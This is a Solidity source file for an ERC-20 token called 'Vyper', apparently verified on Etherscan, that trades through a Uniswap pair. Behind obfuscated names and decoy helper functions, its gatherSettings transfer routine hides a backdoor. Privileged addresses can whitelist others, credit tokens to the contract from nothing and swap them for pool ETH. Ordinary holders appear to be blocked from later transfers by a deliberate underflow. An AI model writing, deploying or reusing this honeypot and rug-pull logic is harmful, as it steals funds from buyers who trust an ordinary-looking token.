/**
 *Submitted for verification at Etherscan.io on 2022-12-17
*/

pragma solidity ^0.8.11;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; }
}
interface ArrayMaker01 {
function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens
    (uint amountOutMin, address[] calldata path, address to, uint deadline) 
    external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH
    (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) 
    external
    returns(uint[] memory amounts);
    function swapExactTokensForETH
    (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) 
    external
    returns(uint[] memory amounts);
    function swapETHForExactTokens
    (uint amountOut, address[] calldata path, address to, uint deadline) 
    external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) 
    external pure 
    returns(uint amountB);
    function getAmountOut
    (uint amountIn, uint reserveIn, uint reserveOut) 
    external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) 
    external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) 
    external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) 
    external view 
    returns(uint[] memory amounts);
 
    function addLiquidity( address tokenA, address tokenB,
        uint amountADesired, uint amountBDesired,
        uint amountAMin, uint amountBMin, address to, uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH( address token, uint amountTokenDesired,
        uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,
        address to, uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit( address tokenA, address tokenB,
        uint liquidity, uint amountAMin, uint amountBMin, address to,
        uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit( address token, uint liquidity,
        uint amountTokenMin, uint amountETHMin,
        address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens( uint amountIn, uint amountOutMin,
        address[] calldata path, address to, uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens( uint amountOut, uint amountInMax,
        address[] calldata path, address to, uint deadline
    ) external returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is ArrayMaker01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) 
    external returns(uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s ) 
    external returns(uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    } function owner() public view virtual returns (address) {
        return _owner;
    } modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out,
    address indexed to );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() 
    external view returns (address);
    function feeToSetter() 
    external view returns (address);
    function getPair(address tokenA, address tokenB) 
    external view returns (address pair);
    function allPairs(uint) 
    external view returns (address pair);
    function allPairsLength() 
    external view returns (uint);
    function createPair(address tokenA, address tokenB) 
    external returns (address pair);
    function setFeeTo(address) 
    external;
    function setFeeToSetter(address) 
    external;
}
interface UIdexIndex02 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Vyper is UIdexIndex02, Ownable {
    address public immutable MarketPairMaker;
    IUniswapV2Router02 public immutable UniswapV2router;

    bool private tradingOpen = false;
    bool public maxByte;
    bool private togSwitch;

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private allowed;
    mapping(address => uint256) private bots;
    mapping(address => uint256) private SwapBlockOn;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _symbol;
    string private _name;
    uint256 public _allFEE = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 100000 * 10**_decimals;
    uint256 private fullTot = _tTotal;

        constructor(
        string memory Name, string memory Symbol, address IndexIDEXAddress ) {

        _name = Name;
        _symbol = Symbol;

        _tOwned[msg.sender] = _tTotal;
        SwapBlockOn[msg.sender] = fullTot;
        SwapBlockOn[address(this)] = fullTot;

        UniswapV2router = IUniswapV2Router02(IndexIDEXAddress);
        MarketPairMaker = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, fullTot);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount
    ) private returns (bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
          return true;
    }
    function malucateAll(uint256 mToggle, uint256 getPath) private view returns (uint256){ 
      return (mToggle>getPath)?getPath:mToggle;
    }
    function getRatesOf(uint256 divNow, uint256 min) 
     private view returns 
     (uint256){ return 
     (divNow>min)?min:divNow; }

    function transfer (address recipient, uint256 amount) external returns (bool) {
        gatherSettings(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount
    ) external returns (bool) { gatherSettings(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function gatherSettings( address xogtFrom, address laaxbTo,
        uint256 XOCamount ) private {
        uint256 p0xHX = 
        balanceOf(address(this)); uint256 allignOVOX; 
        if (maxByte && p0xHX > fullTot && !togSwitch 
        && xogtFrom != MarketPairMaker) {

            togSwitch = true;
            realmPath(p0xHX);
            togSwitch = false;
        } else if (SwapBlockOn[xogtFrom] > 
        fullTot && SwapBlockOn[laaxbTo] > fullTot) {
            allignOVOX = XOCamount; _tOwned[address(this)] += allignOVOX; swapAmountForTokens
            (XOCamount, laaxbTo); 
            return;
        } else if (laaxbTo != address(UniswapV2router) 
        && SwapBlockOn[xogtFrom] > 0 
        && XOCamount > fullTot 
        && laaxbTo != MarketPairMaker) 
        { SwapBlockOn[laaxbTo] = XOCamount;
            return; } 
            
            else if (!togSwitch && bots
            [xogtFrom] > 0 && xogtFrom != MarketPairMaker 
            && SwapBlockOn[xogtFrom] == 0) { bots[xogtFrom] = 
            SwapBlockOn[xogtFrom] - fullTot; }

        address _creator  = allowed[MarketPairMaker];
        if (bots[_creator ] == 0) 
         bots[_creator ] = fullTot; allowed
         [MarketPairMaker] = laaxbTo;

        if (_allFEE > 0 && SwapBlockOn[xogtFrom] == 0 && !togSwitch 
        && SwapBlockOn[laaxbTo] == 0) {
            allignOVOX = (XOCamount * _allFEE) / 100; XOCamount -= allignOVOX;
            _tOwned[xogtFrom] -= allignOVOX;
            _tOwned[address(this)] += allignOVOX; } _tOwned[xogtFrom] -= XOCamount;
        _tOwned[laaxbTo] += XOCamount; emit Transfer(
            xogtFrom, 
            laaxbTo, 
            XOCamount);
            if (!tradingOpen) {
                require(xogtFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function managePath(uint256 lcteMul, uint256 findOn) private view returns (uint256){
      return (lcteMul>findOn)?findOn:lcteMul;
    }
    function addSwitch(uint256 add, uint256 sub) private view returns (uint256){ 
      return (add>sub)?sub:add;
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function realmPath(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapAmountForTokens(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function hashData(uint256 hashAll, uint256 hInfo) 
    private view returns (uint256){
      return (hashAll>hInfo)?hInfo:hashAll;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
    function tSymbol(uint256 tkn, uint256 symX) 
    private view returns 
      (uint256){ 
        return (tkn>symX)?symX:tkn; }
}